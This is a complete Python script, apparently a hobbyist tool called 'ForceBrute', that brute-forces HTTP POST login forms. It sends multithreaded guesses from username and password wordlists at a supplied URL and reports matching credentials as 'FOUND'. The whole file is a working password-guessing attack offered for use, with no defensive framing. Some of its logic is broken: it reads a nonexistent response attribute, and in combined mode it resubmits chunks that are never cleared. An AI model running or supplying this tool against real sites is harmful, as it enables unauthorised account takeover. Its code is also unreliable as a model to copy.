import requests
import argparse
import threading
import numpy
import signal

stop_event = threading.Event()

def printBanner():
    
    print("="*100)

    print("""
    ▄████  ████▄ █▄▄▄▄ ▄█▄    ▄███▄   ███   █▄▄▄▄  ▄     ▄▄▄▄▀ ▄███▄   
    █▀   ▀ █   █ █  ▄▀ █▀ ▀▄  █▀   ▀  █  █  █  ▄▀   █ ▀▀▀ █    █▀   ▀  
    █▀▀    █   █ █▀▀▌  █   ▀  ██▄▄    █ ▀ ▄ █▀▀▌ █   █    █    ██▄▄    
    █      ▀████ █  █  █▄  ▄▀ █▄   ▄▀ █  ▄▀ █  █ █   █   █     █▄   ▄▀ 
    █             █   ▀███▀  ▀███▀   ███     █  █▄ ▄█  ▀      ▀███▀   
    ▀           ▀                          ▀    ▀▀▀                   """)


    print("\n\nby: richard-natan\n")
    print("="*100)



# Make request
def makePostRequisition(login, password):
    try:
        data = {args.login_parameter: login, args.password_parameter: password}
 
        resp = requests.post(args.url, data, allow_redirects=False, timeout=6)

        if args.response_text != None:
            if args.response_text in resp.text:
                print(f"[{login}] AND [{password}] ---- FAILED")
            else:
                print('='*100 + "\n\n")
                print(f"[{login}] AND [{password}] ---- FOUND")
                print("\n" + '='*100)
                stopScript()
                
        else:
            if resp.status_code != args.response_code:
                print(f"[{login}] AND [{password}] ---- [{resp.response_code}]")
            else:
                print('='*100 + "\n\n")
                print(f"[{login}] AND [{password}] ---- FOUND")
                print("\n\n" + '='*100)
                stopScript()
    except requests.Timeout:
        print("Cannot connect to the URL")
        stopScript()

# Threads function
def threadFunction(wordlist, type):
    if not stop_event.is_set():
        if type == "password": # Password brute force
         for password in wordlist:    
            makePostRequisition(args.login, password.strip())
        elif type == "login":# Login brute force
          for login in wordlist:
            makePostRequisition(login.strip(), args.password)
        elif type == "both": # Both brute force
         for login, password in wordlist:
            makePostRequisition(login.strip(), password.strip())
            

# Function to split chunk by Threads and start Threads
def singleWordlistChunkProcess(wordlist, type):
    splited_chunk = numpy.array_split(wordlist, args.threads)

    for list in splited_chunk:
        new_thread = threading.Thread(target=threadFunction, args=(list, type,))
        pool_threads.append(new_thread)
        new_thread.start()
    
    for thread in pool_threads:
        thread.join()

def stopScript():
    stop_event.set()
    quit()
    exit()


    
# Detect what type of brute force will run
def detectMode(login_is_wordlist, password_is_wordlist):
    if login_is_wordlist == None and password_is_wordlist != None:
        return "password_bruteforce"    
    elif login_is_wordlist != None and password_is_wordlist == None:
        return "login_bruteforce"
    else:
        return "both_bruteforce"
       
parser = argparse.ArgumentParser(
    prog="ForceBrute",
    description="Brute force script for HTTP post forms."
)

args_login_group = parser.add_mutually_exclusive_group(required=True)
args_login_group.add_argument("-l", "--login", help="-l/--login for a specific username")
args_login_group.add_argument("-L", "--LOGIN", help="-L/--LOGIN for a username wordlist")

args_password_group = parser.add_mutually_exclusive_group(required=True)
args_password_group.add_argument("-p", "--password", help="-p for a specific password")
args_password_group.add_argument("-P", "--PASSWORD", help="-P for a password wordlist")

args_response_group = parser.add_mutually_exclusive_group(required=True)
args_response_group.add_argument("-rt", "--response-text", type=str, help="Response for failed login")
args_response_group.add_argument("-rc", "--response-code", type=int, help="Response code for successful login")

parser.add_argument("-t", "--threads", type=int, default=5,help="Value of threads (default is 5 and max is 120)")
parser.add_argument("-lp", "--login-parameter", type=str, help="Parameter login used to make the POST request" ,required=True)
parser.add_argument("-pp", "--password-parameter", type=str, help="Parameter password used to make the POST request" ,required=True)
parser.add_argument("-u", "--url", help="URL for login form", required=True)
args = parser.parse_args()

if args.threads > 120:
    args.threads = 120
    print(args.threads)

pool_threads = []
chunk_size = 1000
chunk = []

try:
    printBanner()

    if detectMode(args.LOGIN, args.PASSWORD) == "login_bruteforce":
        # Login brute-force
        type = "login"
        with open (args.LOGIN, 'r', encoding="latin-1") as login_wordlist:
            for line in login_wordlist:
                chunk.append(line.strip())

                if len(chunk) >= chunk_size:
                    singleWordlistChunkProcess(chunk, type)
                    chunk = []
            if chunk:
                singleWordlistChunkProcess(chunk, type)

        
    elif detectMode(args.LOGIN, args.PASSWORD) == "password_bruteforce":
        # Password brute-force
        type = "password"
        with open (args.PASSWORD, 'r', encoding="latin-1") as password_wordlist:
            for line in password_wordlist:
                chunk.append(line.strip())

                if len(chunk) >= chunk_size:
                    singleWordlistChunkProcess(chunk, type)
                    chunk = []
            
            if chunk:
                singleWordlistChunkProcess(chunk, type)
    else:
        # Username and Password brute-force
        type = "both"
        with open (args.LOGIN, 'r', encoding="latin-1") as login_wordlist, open (args.PASSWORD, 'r', encoding="latin-1") as password_wordlist:
            for login in login_wordlist:
                for password in password_wordlist:
                    chunk.append((login.strip(), password.strip()))
                    if len(chunk) >= chunk_size:
                        singleWordlistChunkProcess(chunk, type)
                password_wordlist.seek(0)
            if chunk:
                singleWordlistChunkProcess(chunk, type)
                chunk = []

except KeyboardInterrupt:
    stopScript()